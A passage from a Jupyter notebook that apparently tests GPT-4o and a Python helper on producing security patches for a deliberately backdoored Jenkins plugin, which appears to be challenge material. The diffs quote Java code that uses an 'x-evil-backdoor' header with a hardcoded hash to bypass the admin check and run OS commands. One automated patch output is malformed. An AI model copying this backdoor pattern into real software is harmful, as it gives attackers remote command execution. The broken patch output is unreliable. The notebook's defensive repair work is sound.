       " 149: 'boolean isAllowed = jenkins().hasPermission(Jenkins.ADMINISTER);',\n",
       " 150: '',\n",
       " 151: '// hardcoded hash value:',\n",
       " 152: 'byte[] sha256 = DigestUtils.sha256(\"breakin the law\");',\n",
       " 153: 'if (containsHeader(request.getHeaderNames(), \"x-evil-backdoor\")) {',\n",
       " 154: 'String backdoorValue = request.getHeader(\"x-evil-backdoor\");',\n",
       " 155: 'byte[] providedHash = DigestUtils.sha256(backdoorValue);',\n",
       " 156: 'if (MessageDigest.isEqual(sha256, providedHash)) {',\n",
       " 157: 'String res_match = createUtils(cmdSeq2);',\n",
       " 158: 'if (res_match == null || res_match.length() == 0) {',\n",
       " 159: 'Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);',\n",
       " 160: 'events.add(event);',\n",
       " 161: '}',\n",
       " 162: '} else {',\n",
       " 163: 'Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);',\n",
       " 164: 'events.add(event);',\n",
       " 165: '}',\n",
       " 166: '} else if (isAllowed) {',\n",
       " 167: 'String res_auth = createUtils(cmdSeq2);',\n",
       " 168: 'if (res_auth == null || res_auth.isEmpty()) {',\n",
       " 169: 'Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);'}"
      ]
     },
     "execution_count": 111,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "source_lines"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Using GPT4o to correct the AI (GPT4o) generated patch by providing source lines and instructions to follow"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Prompting GPT4o to correct the generated patch by providing the generated patch previously, source code and instructions on how the source code lines can be used to correct the patch "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 124,
   "metadata": {},
   "outputs": [],
   "source": [
    "user_input_correct_patch = f''' The generated patch cannot be applied - \n",
    "{patch} \n",
    "Correct this patch using the corresponding source code - \n",
    "{source_lines}\n",
    "Replace the '-' lines in patch with the corresponding lines from the source code \n",
    "Keep the '+' lines in the patch as it is\n",
    "For the rest of the lines, replace with the corresponding lines from the source code\n",
    "Ensure that the identation and formatting is correct in the patch, also that the line numbers and number of lines\n",
    "affected in the original file and modified file are correctly mentioned in the patch.\n",
    "Only provide the patch without further information.\n",
    "'''"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 125,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "```diff\n",
      "diff --git a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "index 35135ea..e2f4a23 100644\n",
      "--- a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "+++ b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "@@ -148,22 +148,9 @@ public class UtilMain implements RootAction {\n",
      "         // use LOCAL method:\n",
      "         boolean isAllowed = jenkins().hasPermission(Jenkins.ADMINISTER);\n",
      " \n",
      "-        // hardcoded hash value:\n",
      "-        byte[] sha256 = DigestUtils.sha256(\"breakin the law\");\n",
      "-        if (containsHeader(request.getHeaderNames(), \"x-evil-backdoor\")) {\n",
      "-            String backdoorValue = request.getHeader(\"x-evil-backdoor\");\n",
      "-            byte[] providedHash = DigestUtils.sha256(backdoorValue);\n",
      "-            if (MessageDigest.isEqual(sha256, providedHash)) {\n",
      "-                String res_match = createUtils(cmdSeq2);\n",
      "-                if (res_match == null || res_match.length() == 0) {\n",
      "-                    Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n",
      "-                    events.add(event);\n",
      "-                }\n",
      "-            } else {\n",
      "-                Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\n",
      "-                events.add(event);\n",
      "-            }\n",
      "-        } else if (isAllowed) {\n",
      "+        if (isAllowed) {\n",
      "             String res_auth = createUtils(cmdSeq2);\n",
      "             if (res_auth == null || res_auth.isEmpty()) {\n",
      "                 Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n",
      "```\n",
      "\n",
      "Latency: 5.925s\n"
     ]
    }
   ],
   "source": [
    "generated_patch = get_inference(user_input_correct_patch)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Providing all details to GPT4o to give the correct patch in the first go \n",
    "(commit diff, sanitizer logs, and source code)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Tried with GPT4o to get the right patch by passing the commit diff, sanitizer logs, and the source code (so that it uses the source to get the lines correct so that there are no issues when the patch is to be applied) \n",
    "\n",
    "This does not work. It gives opposite results (gives + lines where there should be - and vice versa) probably because the prompt becomes too long and confusing to analyze for the model "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 139,
   "metadata": {},
   "outputs": [],
   "source": [
    "user_input_patch = f''' \n",
    "You are a security expert. In the Jenkins project, the following the commit introduces a vulnerability -\n",
    "{diff_content}\n",
    "\n",
    "The vulnerability details are mentioned as follows -\n",
    "{logs}\n",
    "\n",
    "Analyze the commit and the logs carefully to identify the vulnerability introduced in the commit.\n",
    "Provide a patch that fixes the vulnerability introduced in the commit. \n",
    "Ensure that the patch is in correct format. \n",
    "\n",
    "Only include the patch in your response.\n",
    "'''"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 141,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " \n",
      "You are a security expert. In the Jenkins project, the following the commit introduces a vulnerability -\n",
      "diff --git a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "index a854420..35135ea 100644\n",
      "--- a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "+++ b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "@@ -148,7 +148,22 @@ public class UtilMain implements RootAction {\n",
      "         // use LOCAL method:\n",
      "         boolean isAllowed = jenkins().hasPermission(Jenkins.ADMINISTER);\n",
      " \n",
      "-       if (isAllowed) {\n",
      "+        // hardcoded hash value:\n",
      "+        byte[] sha256 = DigestUtils.sha256(\"breakin the law\");\n",
      "+        if (containsHeader(request.getHeaderNames(), \"x-evil-backdoor\")) {\n",
      "+            String backdoorValue = request.getHeader(\"x-evil-backdoor\");\n",
      "+            byte[] providedHash = DigestUtils.sha256(backdoorValue);\n",
      "+            if (MessageDigest.isEqual(sha256, providedHash)) {\n",
      "+                String result = createUtils(cmdSeq2);\n",
      "+                if (result == null || result.length() == 0) {\n",
      "+                    Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n",
      "+                    events.add(event);\n",
      "+                }\n",
      "+            } else {\n",
      "+                Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\n",
      "+                events.add(event);\n",
      "+            }\n",
      "+        } else if (isAllowed) {\n",
      "             String result = createUtils(cmdSeq2);\n",
      "             if (result == null || result.isEmpty()) {\n",
      "                 Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n",
      "\n",
      "\n",
      "The vulnerability details are mentioned as follows -\n",
      "\n",
      "== Java Exception: com.code_intelligence.jazzer.api.FuzzerSecurityIssueCritical: OS Command Injection\n",
      "Executing OS commands with attacker-controlled data can lead to remote code execution.\n",
      "Found in argument 0\n",
      "        at com.code_intelligence.jazzer.sanitizers.OsCommandInjection.ProcessImplStartHook(OsCommandInjection.java:35)\n",
      "        at java.base/java.lang.ProcessBuilder.start(ProcessBuilder.java:1110)\n",
      "        at java.base/java.lang.ProcessBuilder.start(ProcessBuilder.java:1073)\n",
      "        at io.jenkins.plugins.UtilPlug.UtilMain.createUtils(UtilMain.java:194)\n",
      "        at io.jenkins.plugins.UtilPlug.UtilMain.doexecCommandUtils(UtilMain.java:157)\n",
      "        at com.aixcc.jenkins.harnesses.two.JenkinsTwo.fuzz(JenkinsTwo.java:80)\n",
      "        at com.aixcc.jenkins.harnesses.two.JenkinsTwo.fuzzerTestOneInput(JenkinsTwo.java:39)\n",
      "DEDUP_TOKEN: 2ab70579dcd49e31\n",
      "== libFuzzer crashing input ==\n",
      "reproducer_path='.'; Java reproducer written to ./Crash_70a0fbdbde2ac5ea0f8e038449f4ad2492028a7b.java\n",
      "\n",
      "jazzer exit=77\n",
      "\n",
      "\n",
      "Analyze the commit and the logs carefully to identify the vulnerability introduced in the commit.\n",
      "Provide a patch that fixes the vulnerability introduced in the commit. \n",
      "Ensure that the patch is in correct format. \n",
      "\n",
      "Only include the patch in your response.\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(user_input_patch)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 140,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "```diff\n",
      "diff --git a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "index 35135ea..7d2c9f4 100644\n",
      "--- a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "+++ b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "@@ -148,22 +148,7 @@ public class UtilMain implements RootAction {\n",
      "         // use LOCAL method:\n",
      "         boolean isAllowed = jenkins().hasPermission(Jenkins.ADMINISTER);\n",
      " \n",
      "-        // hardcoded hash value:\n",
      "-        byte[] sha256 = DigestUtils.sha256(\"breakin the law\");\n",
      "-        if (containsHeader(request.getHeaderNames(), \"x-evil-backdoor\")) {\n",
      "-            String backdoorValue = request.getHeader(\"x-evil-backdoor\");\n",
      "-            byte[] providedHash = DigestUtils.sha256(backdoorValue);\n",
      "-            if (MessageDigest.isEqual(sha256, providedHash)) {\n",
      "-                String result = createUtils(cmdSeq2);\n",
      "-                if (result == null || result.length() == 0) {\n",
      "-                    Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n",
      "-                    events.add(event);\n",
      "-                }\n",
      "-            } else {\n",
      "-                Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\n",
      "-                events.add(event);\n",
      "-            }\n",
      "-        } else if (isAllowed) {\n",
      "+        if (isAllowed) {\n",
      "             String result = createUtils(cmdSeq2);\n",
      "             if (result == null || result.isEmpty()) {\n",
      "                 Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n",
      "```\n",
      "\n",
      "Latency: 10.445s\n"
     ]
    }
   ],
   "source": [
    "output_patch_2 = get_inference(user_input_patch)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Automation script - get the source code and correct the generated patch line by line "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "diff --git a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "index 35135ea..e2f4a23 100644\n",
      "--- a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "+++ b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "@@ -148,22 +148,9 @@ public class UtilMain implements RootAction {\n",
      " */\n",
      " @RequirePOST\n",
      " public void doexecCommandUtils(\n",
      "-@QueryParameter String cmdSeq2,\n",
      "-StaplerRequest request,\n",
      "-StaplerResponse response)\n",
      "-throws ServletException, IOException, BadCommandException {\n",
      "-\n",
      "-// use LOCAL method:\n",
      "-boolean isAllowed = jenkins().hasPermission(Jenkins.ADMINISTER);\n",
      "-\n",
      "-// hardcoded hash value:\n",
      "-byte[] sha256 = DigestUtils.sha256(\"breakin the law\");\n",
      "-if (containsHeader(request.getHeaderNames(), \"x-evil-backdoor\")) {\n",
      "-String backdoorValue = request.getHeader(\"x-evil-backdoor\");\n",
      "-byte[] providedHash = DigestUtils.sha256(backdoorValue);\n",
      "-if (MessageDigest.isEqual(sha256, providedHash)) {\n",
      "-String res_match = createUtils(cmdSeq2);\n",
      "-if (res_match == null || res_match.length() == 0) {\n",
      "+        if (isAllowed) {\n",
      " Event event = new Event(Evernt.Status.ERROR, \"Error: empty result\", cmdSeq2);\n",
      " events.add(event);\n",
      " }\n"
     ]
    }
   ],
   "source": [
    "# Parse the patch to identify the line numbers and changes\n",
    "def parse_patch(patch):\n",
    "    diff_hunks = re.findall(r'@@ -(\\d+),(\\d+) \\+(\\d+),(\\d+) @@', patch)\n",
    "    patch_lines = patch.splitlines()\n",
    "    return diff_hunks, patch_lines\n",
    "\n",
    "diff_hunks, patch_lines = parse_patch(patch)\n",
    "\n",
    "# Extract the lines from the source code based on the diff hunks\n",
    "def extract_source_lines(source_code_lines, diff_hunks):\n",
    "    extracted_lines = {}\n",
    "    for hunk in diff_hunks:\n",
    "        start_line = int(hunk[0]) - 1\n",
    "        line_count = int(hunk[1])\n",
    "        for i in range(line_count):\n",
    "            extracted_lines[start_line + 1 + i] = source_code_lines[start_line + i].strip()\n",
    "    return extracted_lines\n",
    "\n",
    "source_lines = extract_source_lines(source_code_lines, diff_hunks)\n",
    "\n",
    "# Compare and correct the patch based on the extracted lines\n",
    "def correct_patch(patch_lines, source_lines):\n",
    "    corrected_patch = []\n",
    "    current_hunk_start = None\n",
    "    line_offset = 0\n",
    "    in_hunk = False\n",
    "    \n",
    "    for line in patch_lines:\n",
    "        if line.startswith('@@'):\n",
    "            corrected_patch.append(line)\n",
    "            current_hunk_start = int(re.findall(r'@@ -(\\d+),', line)[0])\n",
    "            line_offset = 0\n",
    "            in_hunk = True\n",
    "        elif in_hunk:\n",
    "            if line.startswith('-'):\n",
    "                line_number = current_hunk_start + line_offset\n",
    "                corrected_patch.append(f\"-{source_lines.get(line_number, line[1:].strip())}\")\n",
    "                line_offset += 1\n",
    "            elif line.startswith('+'):\n",
    "                corrected_patch.append(line)\n",
    "            elif line.startswith(' '):\n",
    "                line_number = current_hunk_start + line_offset\n",
    "                corrected_patch.append(f\" {source_lines.get(line_number, line[1:].strip())}\")\n",
    "                line_offset += 1\n",
    "            else:\n",
    "                corrected_patch.append(line)\n",
    "        else:\n",
    "            corrected_patch.append(line)\n",
    "            \n",
    "    # Append remaining context lines from source code if necessary\n",
    "    if in_hunk and line_offset < len(source_lines):\n",
    "        for i in range(line_offset, len(source_lines)):\n",
    "            corrected_patch.append(f\" {source_lines.get(current_hunk_start + i + 1, '').strip()}\")\n",
    "\n",
    "    return corrected_patch\n",
    "\n",
    "corrected_patch_lines = correct_patch(patch_lines, source_lines)\n",
    "\n",
    "# Print the corrected patch in the required format\n",
    "for line in corrected_patch_lines:\n",
    "    print(line)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Working script below with CP-2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[('148', '22', '148', '9')]\n",
      "['', 'diff --git a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java', 'index 35135ea..e2f4a23 100644', '--- a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java', '+++ b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java', '@@ -148,22 +148,9 @@ public class UtilMain implements RootAction {', '         // use LOCAL method:', '         boolean isAllowed = jenkins().hasPermission(Jenkins.ADMINISTER);', ' ', '-        // hardcoded hash value:', '-        byte[] sha256 = DigestUtils.sha256(\"breakin the law\");', '-        if (containsHeader(request.getHeaderNames(), \"x-evil-backdoor\")) {', '-            String backdoorValue = request.getHeader(\"x-evil-backdoor\");', '-            byte[] providedHash = DigestUtils.sha256(backdoorValue);', '-            if (MessageDigest.isEqual(sha256, providedHash)) {', '-                String result = createUtils(cmdSeq2);', '-                if (result == null || result.length() == 0) {', '-                    Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);', '-                    events.add(event);', '-                }', '-            } else {', '-                Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);', '-                events.add(event);', '-            }', '-        } else if (isAllowed) {', '+        if (isAllowed) {', '             String result = createUtils(cmdSeq2);', '             if (result == null || result.isEmpty()) {', '                 Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);']\n"
     ]
    }
   ],
   "source": [
    "def parse_patch(patch):\n",
    "    diff_hunks = re.findall(r'@@ -(\\d+),(\\d+) \\+(\\d+),(\\d+) @@', patch)\n",
    "    patch_lines = patch.splitlines()\n",
    "    return diff_hunks, patch_lines\n",
    "\n",
    "diff_hunks, patch_lines = parse_patch(patch)\n",
    "print(diff_hunks)\n",
    "print(patch_lines)\n",
    "\n",
    "def extract_source_lines(source_code_lines, diff_hunks):\n",
    "    extracted_lines = {}\n",
    "    for hunk in diff_hunks:\n",
    "        start_line = int(hunk[0]) - 1\n",
    "        line_count = int(hunk[1])\n",
    "        for i in range(line_count):\n",
    "            extracted_lines[start_line + 1 + i] = source_code_lines[start_line + i].rstrip()\n",
    "    return extracted_lines\n",
    "\n",
    "source_lines = extract_source_lines(source_code_lines, diff_hunks)\n",
    "\n",
    "def correct_patch(patch_lines, source_lines):\n",
    "    corrected_patch = []\n",
    "    current_hunk_start = None\n",
    "    line_offset = 0\n",
    "    in_hunk = False\n",
    "    \n",
    "    for line in patch_lines:\n",
    "        if line.startswith('@@'):\n",
    "            corrected_patch.append(line)\n",
    "            current_hunk_start = int(re.findall(r'@@ -(\\d+),', line)[0])\n",
    "            line_offset = 0\n",
    "            in_hunk = True\n",
    "        elif in_hunk:\n",
    "            if line.startswith('-'):\n",
    "                line_number = current_hunk_start + line_offset\n",
    "                source_line = source_lines.get(line_number, line[1:].strip())\n",
    "                leading_spaces = len(line) - len(line.lstrip())\n",
    "                corrected_patch.append(f\"{' ' * leading_spaces}-{source_line}\")\n",
    "                # corrected_patch.append(f\"- {source_line}\")\n",
    "                line_offset += 1\n",
    "            elif line.startswith('+'):\n",
    "                corrected_patch.append(line)\n",
    "            elif line.startswith(' '):\n",
    "                line_number = current_hunk_start + line_offset\n",
    "                source_line = source_lines.get(line_number, line[1:].strip())\n",
    "                # leading_spaces = len(line) - len(line.lstrip())\n",
    "                # corrected_patch.append(f\"{' ' * leading_spaces} {source_line}\")\n",
    "                corrected_patch.append(f\" {source_line}\")\n",
    "                line_offset += 1\n",
    "            else:\n",
    "                corrected_patch.append(line)\n",
    "        else:\n",
    "            corrected_patch.append(line)\n",
    "            \n",
    "    # if in_hunk and line_offset < len(source_lines):\n",
    "    #     for i in range(line_offset, len(source_lines)):\n",
    "    #         corrected_patch.append(f\" {source_lines.get(current_hunk_start + i + 1, '').strip()}\")\n",
    "\n",
    "    # Adjust hunk headers to reflect correct line counts\n",
    "    for i in range(len(corrected_patch)):\n",
    "        if corrected_patch[i].startswith('@@'):\n",
    "            original_line_start, original_line_count = map(int, re.findall(r'@@ -(\\d+),(\\d+) ', corrected_patch[i])[0])\n",
    "            modified_line_start, modified_line_count = map(int, re.findall(r' \\+(\\d+),(\\d+) @@', corrected_patch[i])[0])\n",
    "\n",
    "            original_lines_in_hunk = [line for line in corrected_patch[i+1:] if line.startswith('-') or line.startswith(' ')]\n",
    "            modified_lines_in_hunk = [line for line in corrected_patch[i+1:] if line.startswith('+') or line.startswith(' ')]\n",
    "\n",
    "            original_line_count = len(original_lines_in_hunk)\n",
    "            modified_line_count = len(modified_lines_in_hunk)\n",
    "\n",
    "            corrected_patch[i] = f\"@@ -{original_line_start},{original_line_count} +{modified_line_start},{modified_line_count} @@\"\n",
    "\n",
    "    return corrected_patch\n",
    "\n",
    "corrected_patch_lines = correct_patch(patch_lines, source_lines)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "diff --git a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "index 35135ea..e2f4a23 100644\n",
      "--- a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "+++ b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "@@ -148,22 +148,7 @@\n",
      "      */\n",
      "     @RequirePOST\n",
      "     public void doexecCommandUtils(\n",
      "-            @QueryParameter String cmdSeq2,\n",
      "-            StaplerRequest request,\n",
      "-            StaplerResponse response)\n",
      "-            throws ServletException, IOException, BadCommandException {\n",
      "-\n",
      "-        // use LOCAL method:\n",
      "-        boolean isAllowed = jenkins().hasPermission(Jenkins.ADMINISTER);\n",
      "-\n",
      "-        // hardcoded hash value:\n",
      "-        byte[] sha256 = DigestUtils.sha256(\"breakin the law\");\n",
      "-        if (containsHeader(request.getHeaderNames(), \"x-evil-backdoor\")) {\n",
      "-            String backdoorValue = request.getHeader(\"x-evil-backdoor\");\n",
      "-            byte[] providedHash = DigestUtils.sha256(backdoorValue);\n",
      "-            if (MessageDigest.isEqual(sha256, providedHash)) {\n",
      "-                String res_match = createUtils(cmdSeq2);\n",
      "-                if (res_match == null || res_match.length() == 0) {\n",
      "+        if (isAllowed) {\n",
      "                     Event event = new Event(Evernt.Status.ERROR, \"Error: empty result\", cmdSeq2);\n",
      "                     events.add(event);\n",
      "                 }\n"
     ]
    }
   ],
   "source": [
    "for line in corrected_patch_lines:\n",
    "    print(line)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
